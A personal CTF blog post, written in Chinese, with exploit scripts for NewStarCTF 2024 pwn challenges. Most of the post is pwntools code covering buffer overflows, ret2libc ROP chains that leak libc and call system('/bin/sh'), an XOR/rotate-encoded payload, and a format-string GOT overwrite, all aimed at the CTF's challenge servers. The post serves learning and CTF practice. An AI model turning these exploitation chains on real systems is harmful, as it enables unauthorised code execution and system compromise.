---
title: newstarctf2024 pwn个人复现
date: 2024-11-10 21:00:00 +0800
categories: [Blog, pwn]
tags: [pwn]
---
# newstarctf 2024 pwn个人复现
从8月15日开始学习pwn有一段时间，最近似乎又陷入了瓶颈期，经过一段时间的反思，到底还是懒于思考，懒于实践。故鞭策自己，望勤动手，勤复现。
为了能够充分利用有限的时间，在此只记录我认为值得记录的部分。
## week1
都是很基础的内容，其中不乏打开ida点击就送以及基础的ret2text内容
### game
```python
from pwn import *

io = remote("39.106.48.123", 31448)
index=0
while(index<=999):
    io.recvuntil("num:")
    io.sendline(b"9")
    index += 9
    print(index)
io.interactive()
```
### gdb
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("8.147.132.32", 18505)
#io = process('../newstarctf/gdb')
print(pidof(io))
payload = b"\x5d\x1d\x43\x55\x53\x45\x57\x45"
#0x4557455355431d5d
io.recvuntil("data")
io.send(payload)
io.interactive()
```
### overwrite
```python
from pwn import *

io = remote("39.106.48.123", 33789)
payload = cyclic(0x80-0x50) + b"114515"
io.recvuntil("readin")
io.sendline(b"-1")
io.recvuntil("say")
io.sendline(payload)
io.interactive()
```
### ez_game
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("101.200.139.65", 30798)
print(pidof(io))
libc = ELF('../newstarctf/libc-2.31.so')
elf = ELF('../newstarctf/attachment')
main = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x400783
ret = 0x400509

payload1 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil(b"!")
io.sendline(payload1)
puts_addr = u64(io.recvuntil(b'Wel')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
bin_sh = base_addr + next(libc.search(b'/bin/sh'))

payload2 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system_addr)
io.recvuntil(b"!")
io.sendline(payload2)
io.interactive()
```
### My_GBC!!!!!
不知道为什么用自带的libc打不通...最后同时泄露write和read才打通
不过对于初出茅庐的我来说是第一次做到这种对内存编码的题，值得记录
```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux',log_level='debug')

elf = ELF("../newstarctf/My_GBC!!!!!")
io = remote("8.147.132.32", 16222)
#io = process('../newstarctf/My_GBC!!!!!')
libc = ELF("../newstarctf/libc.so.6")

main = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
pop_rdi = 0x4013b3
pop_rsi_pop_r15 = 0x4013b1
ret = 0x40101a
#找不到pop_rdx但是write可以暂时不管

def right_rotate3(byte):
    # 右旋转3位
    return ((byte >> 3) & 0xFF) | ((byte << 5) & 0xFF)
def decrypt(encrypted_data, xor_byte):
    decrypted_data = bytearray(len(encrypted_data))

    for i in range(len(encrypted_data)):
        # 先右旋转3位
        rotated_byte = right_rotate3(encrypted_data[i])

        # 异或操作
        decrypted_data[i] = rotated_byte ^ xor_byte

    return bytes(decrypted_data)

key = 0x5A

print(pidof(io))
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(write_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
write_addr = u64(addr)
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(read_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
read_addr = u64(addr)
print(hex(write_addr))
print(hex(read_addr))

#base_addr = addr - libc.symbols['read']
#system = base_addr + libc.symbols['system']
#bin_sh = base_addr + next(libc.search(b'/bin/sh'))

libc = LibcSearcher('write',write_addr)
libc.add_condition('read',read_addr)
base_addr = read_addr - libc.dump('read')
system = base_addr + libc.dump('system')
bin_sh = base_addr + libc.dump('str_bin_sh')

print(hex(system))
print(hex(bin_sh))
io.recvuntil(b'thing')
payload2 = cyclic(0x10+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
print(payload2)
payload2 = decrypt(payload2, key)
print(pidof(io))
pause()
io.sendline(payload2)
io.interactive()
```
## week2
### EZ_fmt
这道题算是我第一次做fmt类型的题目，为了做这道题才开始翻wiki翻资料，才开始学习fmt。虽说题还算常规，但还是记录下来，也算是记录自己学习fmt的过程。有机会单开一篇讲一下fmt。
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
io = remote("39.106.48.123",29840)
#io = process('./pwn',env={'LD_PRELOAD':'./libc.so.6'})
puts_got = elf.got['puts']
read_got = elf.got['read']
printf_got = elf.got['printf']
memset_got = elf.got['memset']

print(hex(printf_got))

print(p64(read_got))
payload1 = b'AAAAAAAA' + b'|%p|'*10
offset = 8
payload2 = b'%9$s' + b'\x00\x00\x00\x00' + p64(puts_got)  #注意地址被00截断
io.recvuntil(b"data")

io.sendline(payload2)
puts_addr = u64(io.recvuntil(b'data')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
print('system:',hex(system_addr))

data1 = system_addr & 0xFF
data2 = ((system_addr & 0xFFFFFF) >> 8) - data1
data1 = str(data1)
data2 = str(data2)

payload = b'%'+ data1.encode() + b'c%12' + b'$hhn'
payload += b'%'+ data2.encode() + b'c%13' + b'$hn'
payload = payload.ljust(0x20,b'A') + p64(printf_got) + p64(printf_got+1)
payload = payload.ljust(0x30,b'A')

print(pidof(io))
pause()
io.send(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()
```
### Inversted world
这道题真是超超超有意思
```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('101.200.139.65',36871)
elf = ELF('./pwn')
backdoor = elf.sym['backdoor']
backdoor_2 = 0x40137C
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'12345678' * (32) + bytes(reversed(p64(backdoor_2)))
io.recv()
io.sendline(payload)
io.interactive()
```